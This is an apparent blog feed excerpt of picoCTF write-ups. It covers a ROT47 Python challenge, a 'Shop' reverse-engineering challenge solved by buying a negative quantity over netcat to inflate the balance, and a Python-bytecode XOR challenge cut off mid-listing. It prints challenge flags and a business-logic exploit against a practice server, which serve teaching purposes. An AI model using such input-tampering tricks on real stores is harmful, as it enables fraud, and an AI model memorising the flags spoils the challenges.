<code>choose_greatest</code>, thus prompting the user for input and then displaying the largest number based on string comparison</li></ul></li></ul><p>Let’s give a quick summary, just to simplify:</p><ul><li><code>decode_secret</code> is defined, it decodes <code>bezos_cc_secret</code></li><li><code>choose_greatest</code> is defined to find and print the larger of two numbers entered by the user (us) is defined -</li><li><strong>HOWEVER</strong>… only <code>choose_greatest</code> is called</li></ul><h2 id="The-solution"><a href="#The-solution" class="headerlink" title="The solution"></a>The solution</h2><p>So, the code already gives us our solution, but it isn’t called. Instead, only <code>choose_greatest</code> is called. Why is this?</p><p>Simple, it’s a <strong>red herring</strong>:</p><blockquote><p>Something that misleads or distracts from a relevant or important question</p></blockquote><p>So, all we have to do is edit the python file to call <code>decode_secret</code>!</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hiding this really important number in an obscure piece of code is brilliant!</span></span><br><span class="line"><span class="comment"># AND it&#x27;s encrypted!</span></span><br><span class="line"><span class="comment"># This want our biggest client to know his information is safe with us.</span></span><br><span class="line">bezos_cc_secret = <span class="string">&quot;A:4@r%uL`M-^M0c0AbcM-MFE0g4dd`_cgN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Reference alphabet</span></span><br><span class="line">alphabet = <span class="string">&quot;!\&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_secret</span>(<span class="params">secret</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ROT47 decode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: encode and decode are the same operation in the ROT cipher family.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Encryption key</span></span><br><span class="line">    rotate_const = <span class="number">47</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Storage for decoded secret</span></span><br><span class="line">    decoded = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># decode loop</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> secret:</span><br><span class="line">        index = alphabet.find(c)</span><br><span class="line">        original_index = (index + rotate_const) % <span class="built_in">len</span>(alphabet)</span><br><span class="line">        decoded = decoded + alphabet[original_index]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(decoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_greatest</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Echo the largest of the two numbers given by the user to the program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning: this function was written quickly and needs proper error handling</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    user_value_1 = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your first number? &quot;</span>)</span><br><span class="line">    user_value_2 = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your second number? &quot;</span>)</span><br><span class="line">    greatest_value = user_value_1 <span class="comment"># need a value to return if 1 &amp; 2 are equal</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_value_1 &gt; user_value_2:</span><br><span class="line">        greatest_value = user_value_1</span><br><span class="line">    <span class="keyword">elif</span> user_value_1 &lt; user_value_2:</span><br><span class="line">        greatest_value = user_value_2</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>( <span class="string">&quot;The number with largest positive magnitude is &quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(greatest_value) )</span><br><span class="line"></span><br><span class="line">decode_secret(bezos_cc_secret) <span class="comment">### WHAT WE ADDED.</span></span><br><span class="line"></span><br><span class="line">choose_greatest()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag: <code>picoCTF&#123;1|\/|_4_p34|\|ut_8c551048&#125;</code></p>]]></content>
    
    
    <summary type="html">A simple python challenge</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Python" scheme="https://rivers.sh/tags/Python/"/>
    
    <category term="Cryptography" scheme="https://rivers.sh/tags/Cryptography/"/>
    
  </entry>
  
  <entry>
    <title>Shop</title>
    <link href="https://rivers.sh/posts/shop/"/>
    <id>https://rivers.sh/posts/shop/</id>
    <published>2024-11-02T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:12.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Challenge-Disclaimer"><a href="#Challenge-Disclaimer" class="headerlink" title="Challenge Disclaimer"></a>Challenge Disclaimer</h1><p>For this challenge, I went way more in-depth than I had to, basically ALL of what I found wasn’t useful for the beating the challenge, so if you want the actual solution, scroll to the bottom.</p><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>Best Stuff - Cheap Stuff, Buy Buy Buy… Store Instance: <a href="https://mercury.picoctf.net/static/d2c8c9ee59822de6776dd8f20af63b91/source">source</a>. The shop is open for business at <code>nc mercury.picoctf.net 34938</code>.</p><h2 id="Connecting-to-the-netcat-listener"><a href="#Connecting-to-the-netcat-listener" class="headerlink" title="Connecting to the netcat listener"></a>Connecting to the netcat listener</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc mercury.picoctf.net 34938</span><br><span class="line">Thislcome to the market!</span><br><span class="line">=====================</span><br><span class="line">You have 40 coins</span><br><span class="line">ItemPriceCount</span><br><span class="line">(0) Quiet Quiches1012</span><br><span class="line">(1) Average Apple158</span><br><span class="line">(2) Fruitful Flag1001</span><br><span class="line">(3) Sell an Item</span><br><span class="line">(4) Exit</span><br><span class="line">Choose an option:</span><br></pre></td></tr></table></figure><p>So, we have to figure out some sort of way to exploit this online “shop” (hence the challenge name). Since this is a reverse engineering challenge, let’s do some simple reconnaissance on the <code>source</code> file we’re given.</p><h2 id="Gathering-basic-information"><a href="#Gathering-basic-information" class="headerlink" title="Gathering basic information"></a>Gathering basic information</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; file source</span><br><span class="line">source: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, Go BuildID=-vzeqZwk-BVPkjaCfBwI/0p7moXHKZKzCRDvyyGAW/qBY3Sw8xC5RQBA2lE1Ni/wve_VYHzkLpmj9h9LR5b, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>What this tells us about <code>source</code>:</p><ul><li>32-bit file</li><li>ELF (Executable and Linkable Format) binary</li><li>LSB refers to Little Endian, so the least significant bytes are stored first, which is typical for Intel architectures</li><li>Statically linked, so the binary includes all its dependencies and libraries within itself, meaning it’s all self-contained</li><li>Not stripped, so it shouldn’t be missing any symbols or debugging information, making it easier to reverse engineer</li></ul><h2 id="Analyzing-with-Ghidra"><a href="#Analyzing-with-Ghidra" class="headerlink" title="Analyzing with Ghidra"></a>Analyzing with Ghidra</h2><p>Let’s put it through a reverse engineering tool, I’ll be <a href="https://ghidra-sre.org/">Ghidra</a> for this writeup, but you’re welcome to use whatever you prefer:</p><ol><li>Open Ghidra</li><li>Make a temporary project</li><li>Import the file into the project</li><li>Double click the file, select “open in default tool”</li></ol><p>The first thing I like to do is check the Symbol Tree, a hierarchical structure that displays symbols (functions, variables, classes, basically anything that’s an important identifier) within the analyzed binary. This is an important thing to know, as it’ll help you efficiently analyze.</p><p><img src="/images/shop/get_flag.png" alt="get flag"></p><p>Instantly, we notice a function, <code>get_flag</code>. This can double click it to further investigate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">void main.get_flag(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int *in_GS_OFFSET;</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  undefined local_1c [12];</span><br><span class="line">  undefined *local_10;</span><br><span class="line">  undefined **local_c;</span><br><span class="line">  undefined4 local_8;</span><br><span class="line">  undefined4 local_4;</span><br><span class="line"></span><br><span class="line">  while (&amp;stack0x00000000 &lt;= *(undefined **)(*(int *)(*in_GS_OFFSET + -4) + 8)) &#123;</span><br><span class="line">    local_4 = 0x80d453e;</span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">  io/ioutil.ReadFile(&amp;DAT_080fd683,8);</span><br><span class="line">  main.check(local_30,local_2c);</span><br><span class="line">  local_8 = 0;</span><br><span class="line">  local_4 = 0;</span><br><span class="line">  local_10 = &amp;DAT_080e87c0;</span><br><span class="line">  local_c = &amp;main.statictmp_14;</span><br><span class="line">  runtime.convT2Eslice(&amp;DAT_080e2e20,local_1c);</span><br><span class="line">  fmt.Println(&amp;local_10,2,2);</span><br><span class="line">  os.Exit(0);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Some things to note:</p><ul><li><code>io/ioutil.ReadFile</code>, <code>fmt.Println</code>, and <code>os.</code> seem unusual for C, after some further research, I learned that:<ul><li>All these functions originate from the <a href="https://en.wikipedia.org/wiki/Go_(programming_language)">Go</a> programming language</li><li><code>io/ioutil.ReadFile</code> is for reading files</li><li><code>fmt.Println</code> is for printing to standard output</li><li><code>os.exit</code> is for exiting the program</li></ul></li></ul><p>So, it’s clear that this is what reads our flag, if we can somehow call this, we’ll have our flag.</p><p>Let’s try and get the address for the <code>get_flag</code> function, we can do this by right-clicking <code>get_flag</code> in the symbol tree, and selecting “Show references to”. The one we want to pay attention to is the “call”, it should display that the location of it is <code>080d3ec3</code>.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>So, this challenge is a bit too easy for it’s own good. The actual solution is to just buy negative items to increase our coins, and then buy the flag.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc mercury.picoctf.net 34938</span><br><span class="line">Thislcome to the market!</span><br><span class="line">=====================</span><br><span class="line">You have 40 coins</span><br><span class="line">ItemPriceCount</span><br><span class="line">(0) Quiet Quiches1012</span><br><span class="line">(1) Average Apple158</span><br><span class="line">(2) Fruitful Flag1001</span><br><span class="line">(3) Sell an Item</span><br><span class="line">(4) Exit</span><br><span class="line">Choose an option:</span><br><span class="line">0</span><br><span class="line">How many do you want to buy?</span><br><span class="line">-20</span><br><span class="line">You have 240 coins</span><br><span class="line">ItemPriceCount</span><br><span class="line">(0) Quiet Quiches1032</span><br><span class="line">(1) Average Apple158</span><br><span class="line">(2) Fruitful Flag1001</span><br><span class="line">(3) Sell an Item</span><br><span class="line">(4) Exit</span><br><span class="line">Choose an option:</span><br><span class="line">2</span><br><span class="line">How many do you want to buy?</span><br><span class="line">1</span><br><span class="line">Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125]</span><br></pre></td></tr></table></figure><p>Our flag is given to us in an encrypted format, so let’s run it through <a href="https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=MTEyIDEwNSA5OSAxMTEgNjcgODQgNzAgMTIzIDk4IDUyIDEwMCA5NSA5OCAxMTQgMTExIDEwMyAxMTQgOTcgMTA5IDEwOSAxMDEgMTE0IDk1IDk4IDk3IDU0IDk4IDU2IDk5IDEwMCAxMDIgMTI1">Cyberchef</a> using the <code>Magic</code> recipe (make sure to remove the brackets!).</p><p>flag: <code>picoCTF&#123;b4d_brogrammer_ba6b8cdf&#125;</code></p>]]></content>
    
    
    <summary type="html">Learning Ghidra basics</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Ghidra Basics" scheme="https://rivers.sh/tags/Ghidra-Basics/"/>
    
  </entry>
  
  <entry>
    <title>Weird Snake</title>
    <link href="https://rivers.sh/posts/weirdsnake/"/>
    <id>https://rivers.sh/posts/weirdsnake/</id>
    <published>2024-11-02T04:00:00.000Z</published>
    <updated>2025-07-17T07:36:15.612Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>I have a friend that enjoys coding and he hasn’t stopped talking about a snake recently He left this <a href="https://artifacts.picoctf.net/c_titan/124/snake">file</a> on my computer and dares me to uncover a secret phrase from it. Can you assist?</p><p>The code for your convenience:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  1           0 LOAD_CONST               0 (4)</span><br><span class="line">              2 LOAD_CONST               1 (54)</span><br><span class="line">              4 LOAD_CONST               2 (41)</span><br><span class="line">              6 LOAD_CONST               3 (0)</span><br><span class="line">              8 LOAD_CONST               4 (112)</span><br><span class="line">             10 LOAD_CONST               5 (32)</span><br><span class="line">             12 LOAD_CONST               6 (25)</span><br><span class="line">             14 LOAD_CONST               7 (49)</span><br><span class="line">             16 LOAD_CONST               8 (33)</span><br><span class="line">             18 LOAD_CONST               9 (3)</span><br><span class="line">             20 LOAD_CONST               3 (0)</span><br><span class="line">             22 LOAD_CONST               3 (0)</span><br><span class="line">             24 LOAD_CONST              10 (57)</span><br><span class="line">             26 LOAD_CONST               5 (32)</span><br><span class="line">             28 LOAD_CONST              11 (108)</span><br><span class="line">             30 LOAD_CONST              12 (23)</span><br><span class="line">             32 LOAD_CONST              13 (48)</span><br><span class="line">             34 LOAD_CONST               0 (4)</span><br><span class="line">             36 LOAD_CONST              14 (9)</span><br><span class="line">             38 LOAD_CONST              15 (70)</span><br><span class="line">             40 LOAD_CONST              16 (7)</span><br><span class="line">             42 LOAD_CONST              17 (110)</span><br><span class="line">             44 LOAD_CONST              18 (36)</span><br><span class="line">             46 LOAD_CONST              19 (8)</span><br><span class="line">             48 LOAD_CONST              11 (108)</span><br><span class="line">             50 LOAD_CONST              16 (7)</span><br><span class="line">             52 LOAD_CONST               7 (49)</span><br><span class="line">             54 LOAD_CONST              20 (10)</span><br><span class="line">             56 LOAD_CONST               0 (4)</span><br><span class="line">             58 LOAD_CONST              21 (86)</span><br><span class="line">             60 LOAD_CONST              22 (43)</span><br><span class="line">             62 LOAD_CONST              23 (106)</span><br><span class="line">             64 LOAD_CONST              24 (123)</span><br><span class="line">             66 LOAD_CONST              25 (89)</span><br><span class="line">             68 LOAD_CONST              26 (87)</span><br><span class="line">             70 LOAD_CONST              27 (18)</span><br><span class="line">             72 LOAD_CONST              28 (62)</span><br><span class="line">             74 LOAD_CONST              29 (47)</span><br><span class="line">             76 LOAD_CONST              20 (10)</span><br><span class="line">             78 LOAD_CONST              30 (78)</span><br><span class="line">             80 BUILD_LIST              40</span><br><span class="line">             82 STORE_NAME               0 (input_list)</span><br><span class="line"></span><br><span class="line">  2          84 LOAD_CONST              31 (&#x27;J&#x27;)</span><br><span class="line">             86 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">  3          88 LOAD_CONST              32 (&#x27;_&#x27;)</span><br><span class="line">             90 LOAD_NAME                1 (key_str)</span><br><span class="line">             92 BINARY_ADD</span><br><span class="line">             94 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">  4          96 LOAD_NAME                1 (key_str)</span><br><span class="line">             98 LOAD_CONST              33 (&#x27;o&#x27;)</span><br><span class="line">            100 BINARY_ADD</span><br><span class="line">            102 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">  5         104 LOAD_NAME                1 (key_str)</span><br><span class="line">            106 LOAD_CONST              34 (&#x27;3&#x27;)</span><br><span class="line">            108 BINARY_ADD</span><br><span class="line">            110 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">  6         112 LOAD_CONST              35 (&#x27;t&#x27;)</span><br><span class="line">            114 LOAD_NAME                1 (key_str)</span><br><span class="line">            116 BINARY_ADD</span><br><span class="line">            118 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">  9         120 LOAD_CONST              36 (&lt;code object &lt;listcomp&gt; at 0x7f704e8a4d40, file &quot;snake.py&quot;, line 9&gt;)</span><br><span class="line">            122 LOAD_CONST              37 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            124 MAKE_FUNCTION            0</span><br><span class="line">            126 LOAD_NAME                1 (key_str)</span><br><span class="line">            128 GET_ITER</span><br><span class="line">            130 CALL_FUNCTION            1</span><br><span class="line">            132 STORE_NAME               2 (key_list)</span><br><span class="line"></span><br><span class="line"> 11     &gt;&gt;  134 LOAD_NAME                3 (len)</span><br><span class="line">            136 LOAD_NAME                2 (key_list)</span><br><span class="line">            138 CALL_FUNCTION            1</span><br><span class="line">            140 LOAD_NAME                3 (len)</span><br><span class="line">            142 LOAD_NAME                0 (input_list)</span><br><span class="line">            144 CALL_FUNCTION            1</span><br><span class="line">            146 COMPARE_OP               0 (&lt;)</span><br><span class="line">            148 POP_JUMP_IF_FALSE      162</span><br><span class="line"></span><br><span class="line"> 12         150 LOAD_NAME                2 (key_list)</span><br><span class="line">            152 LOAD_METHOD              4 (extend)</span><br><span class="line">            154 LOAD_NAME                2 (key_list)</span><br><span class="line">            156 CALL_METHOD              1</span><br><span class="line">            158 POP_TOP</span><br><span class="line">            160 JUMP_ABSOLUTE          134</span><br><span class="line"></span><br><span class="line"> 15     &gt;&gt;  162 LOAD_CONST              38 (&lt;code object &lt;listcomp&gt; at 0x7f704e8a4df0, file &quot;snake.py&quot;, line 15&gt;)</span><br><span class="line">            164 LOAD_CONST              37 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            166 MAKE_FUNCTION            0</span><br><span class="line">            168 LOAD_NAME                5 (zip)</span><br><span class="line">            170 LOAD_NAME                0 (input_list)</span><br><span class="line">            172 LOAD_NAME                2 (key_list)</span><br><span class="line">            174 CALL_FUNCTION            2</span><br><span class="line">            176 GET_ITER</span><br><span class="line">            178 CALL_FUNCTION            1</span><br><span class="line">            180 STORE_NAME               6 (result)</span><br><span class="line"></span><br><span class="line"> 18         182 LOAD_CONST              39 (&#x27;&#x27;)</span><br><span class="line">            184 LOAD_METHOD              7 (join)</span><br><span class="line">            186 LOAD_NAME                8 (map)</span><br><span class="line">            188 LOAD_NAME                9 (chr)</span><br><span class="line">            190 LOAD_NAME                6 (result)</span><br><span class="line">            192 CALL_FUNCTION            2</span><br><span class="line">            194 CALL_METHOD              1</span><br><span class="line">            196 STORE_NAME              10 (result_text)</span><br><span class="line">            198 LOAD_CONST              40 (None)</span><br><span class="line">            200 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f704e8a4d40, file &quot;snake.py&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                12 (to 18)</span><br><span class="line">              6 STORE_FAST               1 (char)</span><br><span class="line">              8 LOAD_GLOBAL              0 (ord)</span><br><span class="line">             10 LOAD_FAST                1 (char)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 LIST_APPEND              2</span><br><span class="line">             16 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   18 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f704e8a4df0, file &quot;snake.py&quot;, line 15&gt;:</span><br><span class="line"> 15           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                16 (to 22)</span><br><span class="line">              6 UNPACK_SEQUENCE          2</span><br><span class="line">              8 STORE_FAST               1 (a)</span><br><span class="line">             10 STORE_FAST               2 (b)</span><br><span class="line">             12 LOAD_FAST                1 (a)</span><br><span class="line">             14 LOAD_FAST                2 (b)</span><br><span class="line">             16 BINARY_XOR</span><br><span class="line">             18 LIST_APPEND              2</span><br><span class="line">             20 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   22 RETURN_VALUE</span><br></pre></td></tr></table></figure><h2 id="Basic-understanding"><a href="#Basic-understanding" class="headerlink" title="Basic understanding"></a>Basic understanding</h2><p>Right away, we should notice the challenge is to reverse engineer an XOR key. Not only is <a href="https://www.geeksforgeeks.org/xor-cipher/">XOR</a> explicitly mentioned towards the bottom of the bytecode dump, but the bitwise operations between the two data sets, <code>input_list</code> and <code>key_list</code> (which we will dive into) gives it away.</p><h2 id="Defining-constants-loading-values-into-input-list"><a href="#Defining-constants-loading-values-into-input-list" class="headerlink" title="Defining constants, loading values into input_list"></a>Defining constants, loading values into <code>input_list</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1           0 LOAD_CONST               0 (4)</span><br><span class="line">            2 LOAD_CONST               1 (54)</span><br><span class="line">            4 LOAD_CONST               2 (41)</span><br><span class="line">           80 BUILD_LIST              40</span><br><span class="line">           82 STORE_NAME               0 (input_list)</span><br></pre></td></tr></table></figure><ul><li><code>LOAD_CONST</code> is called to loads several constant values onto the stack.<ul><li>4, 54, 41, etc. are being loaded.</li></ul></li><li><code>BUILD_LIST</code> is called, it combines the constants that were loaded into a single list. The number <strong>40</strong> in <code>BUILD_LIST 40</code> tells the (Python) interpret that the list will contain 40 values.</li><li><code>STORE_NAME</code> assigns the list to a variable named “input_list”</li></ul><p>This may seem complicated, but the Python code for this looks something like:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input_list = [<span class="number">4</span>, <span class="number">54</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">25</span>, <span class="number">49</span>, <span class="number">33</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">32</span>, ...]</span><br></pre></td></tr></table></figure><h2 id="Initializing-key-str"><a href="#Initializing-key-str" class="headerlink" title="Initializing key_str"></a>Initializing <code>key_str</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">84 LOAD_CONST              31 (&#x27;J&#x27;)</span><br><span class="line">86 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">88 LOAD_CONST              32 (&#x27;_&#x27;)</span><br><span class="line">90 LOAD_NAME                1 (key_str)</span><br><span class="line">92 BINARY_ADD</span><br><span class="line">94 STORE_NAME               1 (key_str)</span><br><span class="line"></span><br><span class="line">96 LOAD_NAME                1 (key_str)</span><br><span class="line">98 LOAD_CONST              